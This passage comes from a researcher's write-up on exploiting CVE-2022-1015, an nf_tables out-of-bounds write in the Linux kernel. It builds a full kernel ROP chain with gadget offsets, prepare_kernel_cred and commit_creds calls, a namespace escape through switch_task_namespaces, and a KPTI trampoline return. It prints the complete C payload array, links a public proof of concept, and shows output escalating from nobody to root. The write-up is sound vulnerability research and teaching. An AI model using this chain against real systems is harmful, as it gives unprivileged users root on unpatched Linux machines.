0xffffc90000237e48:     0x0000000000000000      0xffffc90000237e28
0xffffc90000237e58:     0x0000000000000000      0x0000000000000000
0xffffc90000237e68:     0x0000000000000255      0x0000000000000000
0xffffc90000237e78:     0x0000000000000000      0x00007f1e78003bc8
0xffffc90000237e88:     0x0100007f56c30002      0x0000000000403f1c
0xffffc90000237e98:     0xffffffff812b14d5      0x0000000000000255
0xffffc90000237ea8:     0x0000000000000006      0xffffc90000237f58
0xffffc90000237eb8:     0x00007f1e78003bc8      0xffff888003e33300
```

As you can see there are two `.text` addresses at the addresses `0xffffc90000237de8` and `0xffffc90000237df0`. After debugging a little it became clear that the second one is a **saved return address**. There is also no stack cookie after it in near view.

That address is at offset `0x390` from the beginning of `nft_regs`. That is in-bounds of our `nft_payload_set` OOB write. 

Our upper bound for the OOB write is `0x450`. That leaves us with the ability to write `0xc0 = 192` bytes on the stack. That is 28 words. Should be more than enough for a full ROP chain.

### Building an ROP chain <a name="ropchain"></a>
Now that we have the payload injection sorted it is time we start building an ROP chain.
Our ROP chain could be split into three stages - preparing credentials, leaving the namespace sandbox and returning to userland.


First, we need to setup up our kernel credentials. 

#### prepare_kernel_cred <a name="prepare_kernel_cred"></a>
We need to call `prepare_kernel_cred` passing *NULL* as the argument. If *NULL* is supplied then the credentials will be set to 0 with no groups, full capabilities and no keys. 

In order to do that it would require we know the address of `prepare_kernel_cred`. On my kernel build it is located at offset `0x108aa0` from the kernel base address. According to the `x86_64` convention to set the first argument we need to set the `rdi` register. 

![convention.jpg](https://i.imgur.com/ozIaAxw.png)

So we need just a single gadget here - to pop *rdi*. The return value of the `prepare_kernel_cred` function would of course be saved in the *rax* register as per the [convention](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit).

In total for the prepare_kernel_cred part we would need to pass 3 words. 

I found a suitable gadget to pop the `rdi` register - `0xffffffff81004616 : pop rdi ; ret`.
So the offset from the kernel base would be `0x004616`.

#### commit_creds <a name="commit_creds"></a>
After we have prepared the credentials we need to actually install them upon the current task. To do that we need to call `commit_creds`.

We have the credentials in the `rax` register. However, we need to pass them to the `commit_creds` function. To do that we need to move the `rax` register to the `rdi` register. The function is located at offset `0x108870` from the kernel base. To move `rax` to `rdi` need a `mov rdi, rax` gadget. That means that it would take only 2 words to call `commit_creds`. 

There is one small problem though. There is no `mov rdi, rax ; ret` gadget. The best I could find was the following
```
0xffffffff81020b1d : mov rdi, rax ; mov eax, ebx ; pop rbx ; or rax, rdi ; ret
```
It is at offset `0x020b1d` from the kernel base.
The gadget requires us to pass one dummy value for the `rbx` register.
That would bring the total size of this stage of the ROP chain to 3 words.

#### switch_task_namespaces <a name="switch_task_namespaces"></a>
To exploit this vulnerability we needed the capability `CAP_NET_ADMIN`. We gained it by putting our process in a sandbox - with a user+network namespace. Now it is time to escape our sandbox and leave the namespace.

To do this we are going to use `switch_task_namespaces`. On my build, the entry of that function is at offset `0x107030` from the kernel base. 

We have to pass two things to the function - the task whose namespaces we want to switch and the `struct nsproxy` that holds the namespaces that we are switching to.

We are going to find the task of our process by passing its **pid** to `find_task_by_vpid`. That would return a pointer to a `task_struct`. This pointer is our first argument to `switch_task_namespaces`.

The structure `nsproxy` contains pointers to all (net, mnt, pid, cgroup, etc) per-process namespaces. It esentially defines what namespaces a process uses. Every time a namespace of a process is changed it copies the existing nsproxy and modifies it. So all nsproxy instances can be thought of as modifications of an initial one - that of the `init` process. The initial nsproxy can be accessed with `init_nsproxy`. It is the second argument we pass to `switch_task_namespaces`.

Let's actually see gadgets will be needed to do all of this and how many words we are going to need for this part.

We need 3 words to get the pointer to the `task_struct`. One gadget to pop rdi, a word to actually pass the **pid** of our process and one word to call `find_task_by_vpid`.  

To call `switch_task_namespaces` we would need 5 words. We use a gadget that performs `mov rdi, rax` - because rax holds the pointer to the `task_struct` and we want to pass it as a first argument. However, the gadget that I am using has an unnecessary `pop` in it therefore I need to pass one dummy register. That brings it to two words so far. I need two more words to pass `init_nsproxy` as a second argument - one for the `pop rsi` gadget and one for the address of `init_nsproxy`. And finally, I need a 5th word to call `switch_task_namespaces`.

In total this stage would require 8 words.

#### swapgs_restore_regs_and_return_to_usermode <a name="swapgs"></a>
Now that we have set up our credentials it is time to return execution to usermode. To do that we are going to use a this function as a `KPTI trampoline`. But why do we need to use a *trampoline*?

Well we need to swap our GS register. The GS register in the Linux Kernel is used for per-CPU data structures. We need to swap it as we are moving from kernel-space to user-space. 

We also need to swap the page tables to the userland ones. That is due to the `Kernel Page Table Isolation` feature. It separates user-space and kernel-space page tables - from user-space you can see only user-space pages and minimal kernel-space mappings. From kernel-space however you can see both user-space and kernel-space pages but the user-space pages are not executable. That means that if we don't swap the page tables we cannot return execution to a function from user-space.

The function `swapgs_restore_regs_and_return_to_usermode` is called a **KPTI trampoline** because it swaps the GS register for us, changes the page tables and allows us to pass an IRET frame (Interrupt Return frame). Using the IRET frame we can set the Stack Segment (SS) register, the Stack Pointer (RSP), the RFLAGS register, the Code Segment (CS) register and most importantly - the instruction pointer (RIP).

As the RIP we pass a pointer to a function that will spawn a shell. The rest of the registers we can can save before we send the payload and just return the registers to the same values they had before we entered kernel-space.

Let's take a look at the generated assembly of the `swapgs_restore_regs_and_return_to_usermode`
```
0xffffffff81e00ff0 <+0>:     pop    r15
0xffffffff81e00ff2 <+2>:     pop    r14
0xffffffff81e00ff4 <+4>:     pop    r13
0xffffffff81e00ff6 <+6>:     pop    r12
0xffffffff81e00ff8 <+8>:     pop    rbp
0xffffffff81e00ff9 <+9>:     pop    rbx
0xffffffff81e00ffa <+10>:    pop    r11
0xffffffff81e00ffc <+12>:    pop    r10
0xffffffff81e00ffe <+14>:    pop    r9
0xffffffff81e01000 <+16>:    pop    r8
0xffffffff81e01002 <+18>:    pop    rax
0xffffffff81e01003 <+19>:    pop    rcx
0xffffffff81e01004 <+20>:    pop    rdx
0xffffffff81e01005 <+21>:    pop    rsi
0xffffffff81e01006 <+22>:    mov    rdi,rsp
0xffffffff81e01009 <+25>:    mov    rsp,QWORD PTR gs:0x6004
0xffffffff81e01012 <+34>:    push   QWORD PTR [rdi+0x30]
0xffffffff81e01015 <+37>:    push   QWORD PTR [rdi+0x28]
0xffffffff81e01018 <+40>:    push   QWORD PTR [rdi+0x20]
0xffffffff81e0101b <+43>:    push   QWORD PTR [rdi+0x18]
0xffffffff81e0101e <+46>:    push   QWORD PTR [rdi+0x10]
0xffffffff81e01021 <+49>:    push   QWORD PTR [rdi]
...
0xffffffff81e01069 <+121>:   pop    rax
0xffffffff81e0106a <+122>:   pop    rdi
0xffffffff81e0106b <+123>:   swapgs
...
```
Looking at the generated assembly we see that we pop a lot of register at the start. We wouldn't want to pass that many dummy values in the ROP chain so we are going to actually call the function at offset `<+22>` where the first move function starts. However, we will still have to pass two dummy values for the pop instructions at `<+122>` and `<+123>`.

The order of the registers that we pass to the IRET frame should be `RIP CS RFLAGS SP SS`

So in total, this part of the ROP chain would take us:
+ 1 word to pass the address of `swapgs_restore_regs_and_return_to_usermode+22`
+ 2 dummy words for `rax` and `rdi`
+ 5 words for the IRET frame.

In total 8 words.

#### Summarizing the ROP chain <a name="summ"></a>
The total size of the ROP chain in my case is 23 words. The size will differ between builds due to gadget differences, etc.

```c
int offset = 0;
// clearing interrupts
payload[offset++] = kbase + cli_ret;

// preparing credentials
payload[offset++] = kbase + pop_rdi_ret; 
payload[offset++] = 0x0; // first argument of prepare_kernel_cred
payload[offset++] = kbase + prepare_kernel_cred;

// commiting credentials
payload[offset++] = kbase + mov_rdi_rax_pop_rbx_ret;
payload[offset++] = 0x0; // dummy rbx
payload[offset++] = kbase + commit_creds;

// switching namespaces
payload[offset++] = kbase + pop_rdi_ret;
payload[offset++] = process_id;
payload[offset++] = kbase + find_task_by_vpid;
payload[offset++] = kbase + mov_rdi_rax_pop_rbx_ret;
payload[offset++] = 0x0; // dummy rbx
payload[offset++]	= kbase + pop_rsi_ret;
payload[offset++] = kbase + init_nsproxy;
payload[offset++] = kbase + switch_task_namespaces;

// returning to userland
payload[offset++] = kbase + swapgs_restore_regs_and_return_to_usermode;
payload[offset++] = 0x0; // dummy rax
payload[offset++] = 0x0; // dummy rdi
payload[offset++] = (unsigned long)spawnShell;
payload[offset++] = user_cs;
payload[offset++] = user_rflags;
payload[offset++] = user_sp;
payload[offset++] = user_ss;
```

This is the complete ROP chain.

## Proof-of-Concept <a name="poc"></a>
The PoC is available at [https://github.com/ysanatomic/CVE-2022-1015](https://github.com/ysanatomic/CVE-2022-1015).

```
# ./exploit
[*] CVE-2022-1015 LPE Exploit by @YordanStoychev

uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
[*] Setting up user+network namespace sandbox

[+] STAGE 1: KASLR bypass 
[*] Socket is opened.
[*] Table leak_table created.
[*] Chain output_chain created.
[*] Bitwise expression is setup!
[*] Payload expression is setup!
[*] Verdict is setup!
[*] Address leak rule created!
[*] Packet sent... if no output in a second - it has failed
[*] Listening on port 50005
[&] Leaked Address: 0xffffffff819bfc63
[&] Kernel base address: 0xffffffff81000000

[+] STAGE 2: Escalation
[*] Socket is opened.
[*] Table rop_table created.
[*] Chain output_chain created.
[*] Copy ROP-to-Stack rules created.
[*] Saved userland registers
[#] cs: 0x33
[#] ss: 0x2b
[#] rsp: 0x7ffd969d1da0
[#] rflags: 0x246

[*] TCP Listener and client threads created!
[+] TCP server socket created.
[+] Bind to the port number: 50006
[*] Listening...
[*] Successfully sent 60 bytes SYN!
[*] Successfully received 48 bytes SYN-ACK!
[*] Sending an ACK packet with the payload...
[***] Exploit ran successfully
uid=0(root) gid=0(root)
#
```

## Closing Remarks <a name="closing"></a>
This vulnerability was extremely interesting to re-discover. The nf_tables codebase seems complicated at first but remarkably simple when you know your way around. 

The exploitation stage can be described as a big dose of educational fun even if frustrating at times - especially while hunting for a good hook where the stack is favourable to exploitation.

Massive thanks to [David Bouman](https://twitter.com/pqlqpql). His write-up was very educational - especially the overview of nf_tables that kick-started my research.

I hope this write-up was as much fun to read as it was for me to write it.

Feel free to contact me on Twitter or via email if you have any questions.
